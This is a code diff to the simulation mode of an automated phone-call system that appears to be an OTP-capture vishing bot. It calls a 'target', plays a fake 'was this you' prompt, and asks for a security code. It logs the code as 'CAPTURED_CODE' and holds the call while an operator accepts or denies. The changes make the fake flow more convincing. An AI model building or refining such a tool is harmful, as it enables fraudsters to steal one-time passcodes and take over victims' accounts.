@@ -424,40 +424,54 @@ async def execute_ivr_step(call_id: str, step: str):
 async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
     """Simulate IVR flow for demo/testing (single session)"""
     try:
-        await asyncio.sleep(1)
+        await asyncio.sleep(0.5)
         await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "CALLING", "current_step": "step1"}})
-        await add_call_event(call_id, "CALL_CREATED", f"[SIMULATION] Calling {config.recipient_number}...")
+        await add_call_event(call_id, "CALL_INITIATED", f"Outbound request via {config.from_number}")
         
-        await asyncio.sleep(2)
+        await asyncio.sleep(1)
+        await add_call_event(call_id, "CALL_CREATED", "Call ID: SIM-12345...")
+        
+        await asyncio.sleep(1.5)
         await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
-        await add_call_event(call_id, "CALL_RINGING", "Phone is ringing...")
+        await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
         
         await asyncio.sleep(2)
         await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}})
-        await add_call_event(call_id, "CALL_ESTABLISHED", "Call connected - Single session started")
+        await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
+        
+        await asyncio.sleep(0.5)
+        await add_call_event(call_id, "AMD_DETECTION", "Human voice identified (AMD Success)")
         
         # Step 1
-        await add_call_event(call_id, "STEP1_PLAYING", "Playing: Press 1 if NOT you, Press 0 if it was you")
-        await asyncio.sleep(5)
+        await asyncio.sleep(1)
+        await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 if NOT you, Press 0 if it was you")
+        await asyncio.sleep(4)
         dtmf_step1 = "1"
         await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1, "current_step": "step2"}})
-        await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
+        await add_call_event(call_id, "INPUT_STREAM", f"{dtmf_step1}... (Step 1 Complete)", dtmf_step1)
         
         # Step 2
         await asyncio.sleep(1)
         await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
-        await asyncio.sleep(4)
-        otp_code = "584219"
+        
+        # Simulate digit-by-digit entry
+        otp_code = "445588"
+        for i, digit in enumerate(otp_code):
+            await asyncio.sleep(0.5)
+            partial_code = otp_code[:i+1]
+            if i < len(otp_code) - 1:
+                await add_call_event(call_id, "INPUT_STREAM", f"Receiving: {partial_code}...")
+        
         await db.call_logs.update_one(
             {"id": call_id},
             {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
              "$push": {"dtmf_codes_history": otp_code}}
         )
-        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
+        await add_call_event(call_id, "CAPTURED_CODE", f"Security code: {otp_code}", otp_code, show_verify=True)
         
         # Step 3 - Wait for verification
-        await asyncio.sleep(1)
-        await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify...")
+        await asyncio.sleep(0.5)
+        await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify your code...")
         await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
         
         # In simulation, call stays active until user clicks Accept/Deny
